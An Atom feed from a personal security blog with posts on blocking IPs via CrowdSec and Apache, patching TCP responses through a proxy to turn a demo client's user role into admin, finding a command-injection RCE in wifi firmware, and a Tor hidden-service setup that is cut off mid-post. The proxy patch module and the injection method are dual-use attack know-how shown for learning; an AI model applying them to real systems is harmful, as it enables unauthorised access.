<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>--= 0x25 =--</title>
  
  <subtitle>security stuff</subtitle>
  <link href="https://0x25.github.io/atom.xml" rel="self"/>
  
  <link href="https://0x25.github.io/"/>
  <updated>2023-09-15T16:38:54.840Z</updated>
  <id>https://0x25.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Block malicious IP behind reverse proxy with Apache2 and Crowdsec</title>
    <link href="https://0x25.github.io/2023/09/15/Block-malicious-IP-behind-reverse-proxy-with-Apache2-and-Crowdsec/"/>
    <id>https://0x25.github.io/2023/09/15/Block-malicious-IP-behind-reverse-proxy-with-Apache2-and-Crowdsec/</id>
    <published>2023-09-15T14:59:28.000Z</published>
    <updated>2023-09-15T16:38:54.840Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2023/09/15/Block-malicious-IP-behind-reverse-proxy-with-Apache2-and-Crowdsec/block.png" alt="Block IP crowdsec apache2 x-forwarded-for"> </p><h1 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h1><p>Block malicious incoming IP with Apache2 behind a reverse proxy using X-Forwarding-For and Crowdsec solution.<br>It’s not a Crowdsec help installation. Read the documentation for that :D, browse Internet, we hope you already know the solution.</p><p>You need to have a Apache2 installation of course.</p><p><img src="/2023/09/15/Block-malicious-IP-behind-reverse-proxy-with-Apache2-and-Crowdsec/schema.png" alt="Architecture"></p><h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><p>Your web server is behind a reverse proxy and the only IP he see is the reverse proxy one. You need to activate X-Forwarded-For HTTP header to add client IP in HTTP query. Now, you need to configure Apache2 to logs X-ForWarded-For IP instead of reverse proxy IP. There is multiple example on Internet but basically you can replace :</p><pre><code>LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined</code></pre><p>by</p><pre><code>LogFormat &quot;%&#123;X-Forwarded-For&#125;i %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined</code></pre><p>in apache2.conf/httpd.conf</p><p>Now you can install Crowdsec to your server to protect you from attack. Here is the documentation :  <a href="https://docs.crowdsec.net/docs/getting_started/install_crowdsec/">install crowdsec</a></p><p>Normally Crowdsec install the right Collections (parsers and scenarios) to ingest your Apache2 logs (access.log).</p><pre><code># cscli collections list</code></pre><p>check you see Apache2, base-http-scenario, http-cve</p><pre><code># cscli parsers list</code></pre><p>check you see apache2-logs, dataparse-enrich, goip-enrich, http-logs, syslog-logs</p><pre><code># cscli scenarios list</code></pre><p>a lot …</p><p>At this point Crowdsec will process the logs and make decisions/alerts (# cscli metrics).<br>Now we are going to install custom-bouncer in Crowdsec, all is here <a href="https://doc.crowdsec.net/docs/bouncers/custom/">https://doc.crowdsec.net/docs/bouncers/custom/</a>.<br>When the installation is done we are going to create a folder</p><pre><code># mkdir /etc/crowdsec/custom-script</code></pre><p> and add this script blocklist.sh with vi, vim , nano …<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> #!&#x2F;bin&#x2F;bash</span><br><span class="line"># 0x25</span><br><span class="line"></span><br><span class="line">logpath&#x3D;&#39;&#x2F;tmp&#x2F;blocklist.log&#39;</span><br><span class="line">filepath&#x3D;&#39;&#x2F;etc&#x2F;apache2&#x2F;blocklist.txt&#39;</span><br><span class="line">tmpfilepath&#x3D;&#39;&#x2F;tmp&#x2F;blocklist.tmp&#39;</span><br><span class="line"></span><br><span class="line">action&#x3D;&#39;&#39;</span><br><span class="line">ip&#x3D;&#39;&#39;</span><br><span class="line">duration&#x3D;&#39;&#39;</span><br><span class="line">reason&#x3D;&#39;&#39;</span><br><span class="line">json&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line"># check action</span><br><span class="line">if [[ &quot;$1&quot; !&#x3D; &quot;add&quot; &amp;&amp; &quot;$1&quot; !&#x3D; &quot;del&quot; ]]; then</span><br><span class="line">  echo &quot;$(date) - Error: first arg need to be add or del - $@&quot; &gt;&gt; $logpath</span><br><span class="line">  exit 1</span><br><span class="line">fi</span><br><span class="line">action&#x3D;$1</span><br><span class="line"></span><br><span class="line"># check IP IPV4</span><br><span class="line">if ! [[ &quot;$2&quot; &#x3D;~ ^[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;$ ]]; then</span><br><span class="line">  echo &quot;$(date) - Error: seconf arg need to be an IPv4 - $@&quot; &gt;&gt; $logpath</span><br><span class="line">  exit 1</span><br><span class="line">fi</span><br><span class="line">ip&#x3D;$2</span><br><span class="line"></span><br><span class="line"># check time</span><br><span class="line">if ! [[ &quot;$3&quot; &#x3D;~ ^[-0-9]+$ ]]; then</span><br><span class="line">  echo &quot;$(date) - Error: third arg need to be an integer - $@&quot; &gt;&gt; $logpath</span><br><span class="line">  exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">duration&#x3D;$3</span><br><span class="line">reason&#x3D;$4</span><br><span class="line">json&#x3D;$5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if [[ &quot;$action&quot; &#x3D;&#x3D; &quot;add&quot; ]]; then</span><br><span class="line">  # Add IP</span><br><span class="line">  if ! grep -q -F $ip $filepath; then</span><br><span class="line">    echo &quot;$(date) - Info: add $ip&quot; &gt;&gt; $logpath</span><br><span class="line">    echo &quot;$ip b&quot; &gt;&gt; $filepath</span><br><span class="line">  else</span><br><span class="line">    echo &quot;$(date) - Warning: add $ip already exist&quot; &gt;&gt; $logpath</span><br><span class="line">  fi</span><br><span class="line">else</span><br><span class="line">  # Del IP</span><br><span class="line">  echo &quot;$(date) - Info: del $ip&quot; &gt;&gt; $logpath</span><br><span class="line">  pattern&#x3D;&quot;$ip b&quot;</span><br><span class="line">  sed &quot;&#x2F;$pattern&#x2F;d&quot; $filepath &gt; $tmpfilepath</span><br><span class="line">  cp $tmpfilepath $filepath</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><br><em>disable script log in production</em></p><pre><code># chmod +x blocklist.sh</code></pre><p>configure the custom-bouncer by editing the file </p><pre><code># /etc/crowdsec/bouncers/crowdsec-custom-bouncer.yaml.local</code></pre><p>it depend on your installation but if the file not exist edit the file without .local</p><p>Edit </p><pre><code>bin_path: /etc/crowdsec/custom-script/blocklist.shapi_key: &lt;follow doc&gt;</code></pre><p>now restart crowdsec</p><pre><code># systemctl restart crowdsec.service</code></pre><p>Normally you will see a file in /etc/apache2/ with name bloacklist.txt with data like </p><p><img src="/2023/09/15/Block-malicious-IP-behind-reverse-proxy-with-Apache2-and-Crowdsec/files.png" alt="blocklist"> </p><pre><code>1.2.3.4 b2.3.4.5 b...</code></pre><p>If there is no file you need to check the logs (Crowdsec custom bouncer and blocklist.sh)</p><p>Now we need to configure Apache2 to use this list and block income traffic \o/</p><p>install modrewrite </p><pre><code># a2enmod rewrite</code></pre><p>edit apache2.conf/httpd.conf and add</p><pre><code>active &quot;AllowOverride All&quot;</code></pre><p>add</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteMap blocklist txt:&#x2F;etc&#x2F;apache2&#x2F;blocklist.txt</span><br><span class="line">RewriteCond $&#123;blocklist:%&#123;HTTP:X-Forwarded-For&#125;&#125; ^b$ [NC]</span><br><span class="line">RewriteRule .* - [F,L]</span><br></pre></td></tr></table></figure><p><em>/!\ change apache 2 to httpd if needed</em></p><p>restart apache2</p><pre><code># systemctl restart apache2</code></pre><p>and it is finish :), have fun.</p><p><img src="/2023/09/15/Block-malicious-IP-behind-reverse-proxy-with-Apache2-and-Crowdsec/apache2-CS-X-Forwarded-for-Bouncer.gif" alt="demo"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2023/09/15/Block-malicious-IP-behind-reverse-proxy-with-Apache2-and-Crowdsec/block.png&quot; alt=&quot;Block IP crowdsec apache2 x-forwa</summary>
      
    
    
    
    
    <category term="crowdsec" scheme="https://0x25.github.io/tags/crowdsec/"/>
    
    <category term="apache2" scheme="https://0x25.github.io/tags/apache2/"/>
    
    <category term="x-forwarded-for" scheme="https://0x25.github.io/tags/x-forwarded-for/"/>
    
  </entry>
  
  <entry>
    <title>Patch TCP packets on the fly</title>
    <link href="https://0x25.github.io/2021/09/09/Patch-TCP-packets-on-the-fly/"/>
    <id>https://0x25.github.io/2021/09/09/Patch-TCP-packets-on-the-fly/</id>
    <published>2021-09-09T18:55:39.000Z</published>
    <updated>2021-09-10T09:52:05.218Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/09/09/Patch-TCP-packets-on-the-fly/header.png" alt="tcp"></p><h1 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h1><p>Some time ago I had an application (not web) on a laptop (not admin) which was connected with a remote server. After some research I can change a config file to set a new IP:PORT for the server. With this change, I can intercept the trafic and send it back to the server with tcpproxy.py tool. It help the use of wireshark to look at the traffic and to perfom action.  </p><h1 id="Some-code"><a href="#Some-code" class="headerlink" title="Some code"></a>Some code</h1><p>For this post I coded a client / server to replicate what I got.</p><p>client.py  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import argparse</span><br><span class="line">from itertools import cycle</span><br><span class="line"></span><br><span class="line">default_login &#x3D; &#39;user&#39;</span><br><span class="line">default_data &#x3D; &#39;Hello server&#39;</span><br><span class="line">key &#x3D; &#39;R9pRCDwWG8hw7BYg3wv3tZY&#39;</span><br><span class="line"></span><br><span class="line">parser &#x3D; argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(&#39;-l&#39;,&#39;--login&#39;, default&#x3D;default_login, help&#x3D;&#39;user type [user] or admin&#39;)</span><br><span class="line">parser.add_argument(&#39;-d&#39;,&#39;--data&#39;, default&#x3D;default_data, help&#x3D;&#39;data send to server&#39;)</span><br><span class="line">args &#x3D; parser.parse_args()</span><br><span class="line"></span><br><span class="line">data_input &#x3D; args.data</span><br><span class="line">user_type &#x3D; args.login</span><br><span class="line"></span><br><span class="line">def xor(message,key):</span><br><span class="line">  cryptedMessage &#x3D; &#39;&#39;.join(chr(ord(c)^ord(k)) for c,k in zip(message, cycle(key)))</span><br><span class="line">  return cryptedMessage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;client_config.txt&quot;, &quot;r&quot;)</span><br><span class="line">server &#x3D; f.readline()</span><br><span class="line"></span><br><span class="line">ADRESSE &#x3D; server.split(&#39;:&#39;)[0]</span><br><span class="line">PORT &#x3D; int(server.split(&#39;:&#39;)[1])</span><br><span class="line"></span><br><span class="line"># Create a client socket</span><br><span class="line">clientSocket &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"># Connect to the server</span><br><span class="line">clientSocket.connect((ADRESSE,PORT))</span><br><span class="line"></span><br><span class="line"># Send data to server</span><br><span class="line">data &#x3D; f&quot;&#123;user_type&#125;|&#123;data_input&#125;&quot;</span><br><span class="line">data &#x3D; xor(data,key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">clientSocket.send(data.encode())</span><br><span class="line"></span><br><span class="line"># Receive data from server</span><br><span class="line">dataFromServer &#x3D; clientSocket.recv(1024)</span><br><span class="line"></span><br><span class="line"># Print to the console</span><br><span class="line">xor_output &#x3D; dataFromServer.decode()</span><br><span class="line"></span><br><span class="line">output &#x3D; xor(xor_output,key)</span><br><span class="line">if output.find(&#39;userType:1&#39;) &#x3D;&#x3D; 0:</span><br><span class="line">  print(&quot;you are ADMIN! (userType:1)&quot;)</span><br><span class="line"></span><br><span class="line">if output.find(&#39;userType:0&#39;) &#x3D;&#x3D; 0:</span><br><span class="line">  print(&quot;you are user :&#x2F; (userType:0)&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>client_config.txt  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6781</span><br></pre></td></tr></table></figure><p>server.py  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">from signal import signal, SIGINT</span><br><span class="line">from sys import exit</span><br><span class="line">from itertools import cycle</span><br><span class="line"></span><br><span class="line"># xor key</span><br><span class="line">key &#x3D; &#39;R9pRCDwWG8hw7BYg3wv3tZY&#39;</span><br><span class="line"></span><br><span class="line">def xor(message,key):</span><br><span class="line">  cryptedMessage &#x3D; &#39;&#39;.join(chr(ord(c)^ord(k)) for c,k in zip(message, cycle(key)))</span><br><span class="line">  return cryptedMessage</span><br><span class="line"></span><br><span class="line">def handler(signal_received, frame):</span><br><span class="line">    # Handle any cleanup here</span><br><span class="line">    print(&#39;SIGINT or CTRL-C detected. Exiting gracefully&#39;)</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">signal(SIGINT, handler)</span><br><span class="line"></span><br><span class="line">ADRESSE &#x3D; &#39;127.0.0.1&#39;</span><br><span class="line">PORT &#x3D; 6781</span><br><span class="line"></span><br><span class="line">server &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)     </span><br><span class="line">server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">server.bind((ADRESSE, PORT))</span><br><span class="line">server.listen()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">  client, adresseClient &#x3D; server.accept()</span><br><span class="line">  print(&#39;Connection from &#39;, adresseClient)</span><br><span class="line">  data_rcv &#x3D; client.recv(1024)</span><br><span class="line"></span><br><span class="line">  if not data_rcv:</span><br><span class="line">    print(&#39;Reception error&#39;)</span><br><span class="line"></span><br><span class="line">  else:</span><br><span class="line">    print(&#39;Reception of:&#39; + data_rcv.decode())</span><br><span class="line">    data &#x3D; xor(data_rcv.decode(),key)</span><br><span class="line">    print(f&#39;unxor &#123;data&#125;&#39;)</span><br><span class="line">    datas &#x3D; data.split(&#39;|&#39;)</span><br><span class="line">    user &#x3D; datas[0]</span><br><span class="line"></span><br><span class="line">    if user &#x3D;&#x3D; &#39;admin&#39;:</span><br><span class="line">      response &#x3D; &#39;userType:1;userRight:11111&#39;</span><br><span class="line">    else:</span><br><span class="line">      response &#x3D; &#39;userType:0:userRight:00000&#39;</span><br><span class="line"></span><br><span class="line">    response &#x3D; response + &#39;;randomId:666;randomValue:nodata;someField:&#39; + datas[1]</span><br><span class="line">    xor_response &#x3D; xor(response,key)</span><br><span class="line">    n &#x3D; client.send(xor_response.encode())</span><br><span class="line">        </span><br><span class="line">    if (n !&#x3D; len(response)):</span><br><span class="line">      print(&#39;Send error&#39;)</span><br><span class="line">    else:</span><br><span class="line">      print(&#39;Send ok.&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h1><p><img src="/2021/09/09/Patch-TCP-packets-on-the-fly/diagram.svg" alt="diagram"> </p><p>The information in packets is obfuscated.<br>By default the server listen on 6781.  </p><p>If we look at the server output, in wireshark, we can notice some change in the same place :  </p><p><img src="/2021/09/09/Patch-TCP-packets-on-the-fly/analyse.png" alt="tcp flow"></p><ol><li>request from server when logged as user</li><li>request from server when logged as admin</li></ol><p>The idea is « <strong>what happen if we change the server answer to match a admin response from a user request ?</strong> »<br>We are going to try to do this :). Like I say before we can use <a href="https://github.com/ickerwx/tcpproxy">tcpproxy.py</a> to patch tcp server response.</p><h1 id="Patch-TCP-packet"><a href="#Patch-TCP-packet" class="headerlink" title="Patch TCP packet"></a>Patch TCP packet</h1><p><img src="/2021/09/09/Patch-TCP-packets-on-the-fly/diagram-patch.svg" alt="mitm diagram"></p><p>So we edit the client_config.txt to set the tcpproxy listen port and run it.</p><pre><code>./tcpproxy.py -ti 127.0.0.1 -tp 6781 -li 127.0.0.1 -lp 8888 -om hexdump -im hexdump</code></pre><p><img src="/2021/09/09/Patch-TCP-packets-on-the-fly/tcpproxy.png" alt="tcpproxy"></p><p>View of hexdump from tcpproxy.py : first the user connection and after the admin.<br>tcpproxy.py have the possibility to add module.</p><p>patch.py (add in tcpproxy/proxymodules)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import os.path as path</span><br><span class="line">import re</span><br><span class="line">from itertools import cycle</span><br><span class="line"></span><br><span class="line">class Module:</span><br><span class="line">    def __init__(self, incoming&#x3D;False, verbose&#x3D;False, options&#x3D;None):</span><br><span class="line">        # patch tcp flow</span><br><span class="line">        self.name &#x3D; path.splitext(path.basename(__file__))[0]</span><br><span class="line">        self.description &#x3D; &#39;Patch tcp&#39;</span><br><span class="line">        self.incoming &#x3D; incoming  # incoming means module is on -im chain</span><br><span class="line">        self.start &#x3D; 46</span><br><span class="line">        self.end &#x3D; 66</span><br><span class="line">        self.str &#x3D; b&#39;\x09&#39;</span><br><span class="line">        self.patch &#x3D; b&#39;&#39;</span><br><span class="line">        self.key &#x3D; &#39;R9pRCDwWG8hw7BYg3wv3tZY&#39;</span><br><span class="line"></span><br><span class="line">    def xor(self,data):</span><br><span class="line">        cryptedMessage &#x3D; &#39;&#39;.join(chr(ord(c)^ord(k)) for c,k in zip(data, cycle(self.key)))</span><br><span class="line">        return cryptedMessage</span><br><span class="line"></span><br><span class="line">    def help(self):</span><br><span class="line">        return &#39;\tPatch TCP and more&#39;</span><br><span class="line"></span><br><span class="line">    def execute(self, data):</span><br><span class="line">        packets &#x3D; bytearray(data)</span><br><span class="line">        out &#x3D; self.xor(data.decode())</span><br><span class="line">        print(f&quot;unxor data: &#123;out&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        if bytes(packets[6:11]).hex() &#x3D;&#x3D; &#39;07327d0852&#39;: # test hex signature to detect user packet</span><br><span class="line">            print(&#39;&gt; PATCH USER TO ADMIN&#39;)</span><br><span class="line">            packets[9] &#x3D; 9 # patch user to admin</span><br><span class="line"></span><br><span class="line">        return packets</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    print (&#39;This module is not supposed to be executed alone!&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>No we run the command:  </p><pre><code>./tcpproxy.py -ti 127.0.0.1 -tp 6781 -li 127.0.0.1 -lp 8888 -om hexdump,patch</code></pre><p><img src="/2021/09/09/Patch-TCP-packets-on-the-fly/tcpproxy_patch.png" alt="tcpproxy patch"></p><ol><li>server response</li><li>tcpproxy patch repsonse </li></ol><p><img src="/2021/09/09/Patch-TCP-packets-on-the-fly/patched.png" alt="patched"></p><p>The client.py think we are admin \o/  </p><p><img src="/2021/09/09/Patch-TCP-packets-on-the-fly/patchServerResponse.gif" alt="demo time"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/09/09/Patch-TCP-packets-on-the-fly/header.png&quot; alt=&quot;tcp&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Purpose&quot;&gt;&lt;a href=&quot;#Purpose&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="tcp" scheme="https://0x25.github.io/tags/tcp/"/>
    
    <category term="wireshark" scheme="https://0x25.github.io/tags/wireshark/"/>
    
    <category term="tcpproxy" scheme="https://0x25.github.io/tags/tcpproxy/"/>
    
  </entry>
  
  <entry>
    <title>Zero-day in industrial wifi equipment</title>
    <link href="https://0x25.github.io/2021/08/03/Zero-day-in-industrial-wifi-equipment/"/>
    <id>https://0x25.github.io/2021/08/03/Zero-day-in-industrial-wifi-equipment/</id>
    <published>2021-08-03T17:18:05.000Z</published>
    <updated>2023-09-15T14:57:51.747Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/03/Zero-day-in-industrial-wifi-equipment/reverse.png" alt="reverse">  </p><p>cd# Purpose</p><p>Explain how I find a zero-day in a wifi device.<br>I was working to find vulnerabilities in a web interface of a wifi device. After some time I decide to reverse the firmware ;) to have  access to the code on the server.</p><p><img src="/2021/08/03/Zero-day-in-industrial-wifi-equipment/module.jpg" alt="fake picture">  </p><h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><ul><li><a href="https://tools.kali.org/forensics/binwalk">binwalk</a></li><li><a href="https://github.com/sviehb/jefferson">jefferson</a> </li></ul><h1 id="Get-the-firmware-and-extract-data"><a href="#Get-the-firmware-and-extract-data" class="headerlink" title="Get the firmware and extract data"></a>Get the firmware and extract data</h1><p>The upgrade is available on the website of the manufacturer in the support&gt;download-center page.<br>The upgrade file is a ZIP file. The archive contain :</p><p><img src="/2021/08/03/Zero-day-in-industrial-wifi-equipment/unzip.png" alt="unzip archive">   </p><p>What we want is in .bin file.</p><p><img src="/2021/08/03/Zero-day-in-industrial-wifi-equipment/file.png" alt="file .bin">  </p><p>We are going to extract data from this .bin file with binwalk</p><p><img src="/2021/08/03/Zero-day-in-industrial-wifi-equipment/binwalk.png" alt="binwalk"> </p><p>If you try the command without installing <a href="https://github.com/sviehb/jefferson">jefferson</a> you will get an error. And you need to extract manually the .jffs2 file with the tool.</p><p><img src="/2021/08/03/Zero-day-in-industrial-wifi-equipment/extracted.png" alt="extracted data"></p><p>Now we have a jffs2-root folder \o/</p><p><img src="/2021/08/03/Zero-day-in-industrial-wifi-equipment/tree.png" alt="list folders"> </p><p>We see a linux system.</p><h1 id="Find-a-vulnerability"><a href="#Find-a-vulnerability" class="headerlink" title="Find a vulnerability"></a>Find a vulnerability</h1><p>After a long time to search, understand where files are and read LUA code … I found something interesting.</p><p><img src="/2021/08/03/Zero-day-in-industrial-wifi-equipment/vuln.png" alt="vulnerability"></p><ol><li>the code grep a value from a HTTP form and put it in var <strong><em>radio</em></strong></li><li>the code call an internal script and concatenate it with the var <strong><em>radio</em></strong></li></ol><p>There is no sanitize in the <strong><em>radio</em></strong> value.</p><p><img src="/2021/08/03/Zero-day-in-industrial-wifi-equipment/gui.png" alt="web site"></p><p>Let’s try to inject some value </p><p><img src="/2021/08/03/Zero-day-in-industrial-wifi-equipment/burp.png" alt="Burp"></p><p>We can see that the wifi system run the Ping command \o/, we have an RCE. Next step, get a shell on busybox :)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/08/03/Zero-day-in-industrial-wifi-equipment/reverse.png&quot; alt=&quot;reverse&quot;&gt;  &lt;/p&gt;
&lt;p&gt;cd# Purpose&lt;/p&gt;
&lt;p&gt;Explain how I find a </summary>
      
    
    
    
    
    <category term="zero-day" scheme="https://0x25.github.io/tags/zero-day/"/>
    
    <category term="binwalk" scheme="https://0x25.github.io/tags/binwalk/"/>
    
    <category term="lua" scheme="https://0x25.github.io/tags/lua/"/>
    
  </entry>
  
  <entry>
    <title>Create your hidden Tor service with unix socket</title>
    <link href="https://0x25.github.io/2021/05/02/Create-your-hidden-Tor-service-with-unix-socket/"/>
    <id>https://0x25.github.io/2021/05/02/Create-your-hidden-Tor-service-with-unix-socket/</id>
    <published>2021-05-02T11:35:54.000Z</published>
    <updated>2021-05-02T14:42:59.420Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/05/02/Create-your-hidden-Tor-service-with-unix-socket/tor-header.png" alt="tor hidden service"></p><h1 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h1><p>Create a hidden Tor service with unix socket.<br>Unix domain sockets can provide an additional layer of isolation protection.  </p><p>To do your own service you need Tor and a webserver (Nginx for this example).</p><p>You can use my <a href="https://0x25.github.io/2021/03/10/Docker-SSH-on-the-fly/">prevent post</a> to generate ubuntu docker and access it with simple SSH \o/</p><h1 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h1><p>First install to on your server:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br><span class="line">sudo apt install -y tor nginx php-fpm screen</span><br><span class="line">#sudo apt install nano #optionnal</span><br></pre></td></tr></table></figure><h1 id="Configure-Nginx"><a href="#Configure-Nginx" class="headerlink" title="Configure Nginx"></a>Configure Nginx</h1><p>Create a configuration in /etc/nginx/sites-available/  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;</span><br><span class="line">sudo touch tor</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Put your tor webserver configuration in this file:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 